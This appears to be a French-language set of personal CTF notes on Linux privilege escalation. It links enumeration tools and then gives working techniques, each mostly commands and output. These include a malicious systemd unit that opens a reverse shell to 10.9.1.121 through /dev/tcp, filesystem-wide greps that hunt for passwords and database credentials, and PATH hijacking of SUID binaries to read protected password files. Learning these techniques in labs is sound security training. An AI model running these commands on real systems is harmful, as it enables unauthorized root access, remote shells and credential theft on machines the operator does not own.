# Linux Privesc Basics

## Tools

* [LinPEAS](https://github.com/carlospolop/PEASS-ng)

> [!TIP]
> Pour LinPEAS : ne pas oublier de faire un sudo -l en + du script et de bien lire les suid pas toujours surligné!

* [LinEnum](https://github.com/rebootuser/LinEnum)

* [GTFO bins](https://gtfobins.github.io/)

* [linux exploit suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

* [Espionner les process](https://github.com/DominicBreuker/pspy)

## shells propre depuis un reverse shell

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## privesc via Systemctl

```sh
pepper@jarvis:~$ cat toto.service
cat toto.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i &>/dev/tcp/10.9.1.121/10444 0<&1"
[Install]
WantedBy=multi-user.target

pepper@jarvis:~$ chmod 777 toto.service
chmod 777 toto.service

pepper@jarvis:~$ /bin/systemctl link /home/pepper/toto.service
/bin/systemctl link /home/pepper/toto.service
Created symlink /etc/systemd/system/toto.service -> /home/pepper/toto.service.

pepper@jarvis:~$ /bin/systemctl enable --now /home/pepper/toto.service
/bin/systemctl enable --now /home/pepper/toto.service
Created symlink /etc/systemd/system/multi-user.target.wants/toto.service -> /home/pepper/toto.service.
```

## plain test password

```sh
cat *|grep -i pass
cat */* |grep -i pass
cat */*/* |grep -i pass

grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always

# depuis le repertoire courant:
grep -rnw '.' -ie 'pass' --color=always
```

| Option | Description |
|--------|-------------|
| -r, --recursive    | identique à --directories=recurse |
| -n, --line-number  | afficher le numéro de ligne avec la sortie |
| -w, --word-regexp  | match only whole words |
| -i, --ignore-case  | ignore case distinctions |

## symlink + SUID

Code source :

```c
1. #include <stdlib.h>
2. #include <stdio.h>
3.  
4. /*gcc -m32 -o ch11 ch11.c*/
5.  
6. int main(void)
7. {
8.         system("ls /challenge/app-script/ch11/.passwd"); 
9.         return 0;
10. }
```

attribut `s` sur l’exécutable `ch11`, donc droit de `app-script-ch11-cracked` owner du fichier `.passwd`.

```sh
app-script-ch11@challenge02:~$ ls -la
total 24
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11         4096 Aug 11  2015 .
drwxr-xr-x 14 root                    root                    4096 Nov 17 21:47 ..
-r--r-----  1 app-script-ch11-cracked app-script-ch11-cracked   14 Feb  8  2012 .passwd
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11         7160 Aug 11  2015 ch11
-r--r-----  1 app-script-ch11         app-script-ch11          153 Aug 11  2015 ch11.c
```

Afin d’exécuter `cat` à la place de `ls` il suffit de copier l’exécutable dans `/tmp`

```sh
cp /bin/cat /tmp/ls
PATH=/tmp
echo $PATH #/tmp
```

Donc lorsque on exécutera une nouvelle fois le fichier `ch11` il  lancera `/tmp/ls` qui est une copie de `/bin/cat` :

```sh
app-script-ch11@challenge02:~$ ./ch11
```

Pareil mais avec des arguments:

```c
1. #include <stdlib.h>
2. #include <stdio.h>
3.  
4. int main(){
5.         system("ls -lA /challenge/app-script/ch12/.passwd");
6.         return 0;
7. }
```

```sh
mkdir -p /tmp/myself
vim /tmp/myself/ls
```

Le contenu du script ls ne contient que ceci : (le - final est  important, c’est lui qui permet de ne pas tenir compte des arguments)

```python
# ! /usr/bin/python -
```

On termine de remplacer ls par ce qu’on veut :

```sh
chmod +x /tmp/myself/ls
export PATH=/tmp/myself/:$PATH
./ch12
```

Ca nous ouvre un interpréteur python avec les droits de ch12 et là on fait ce qu’on veut... par exemple :

```python
>>> target = "/challenge/app-script/ch12/.passwd"
>>> with open(target) as f:
...         print(f.read())
...
<flag>
>>>
```
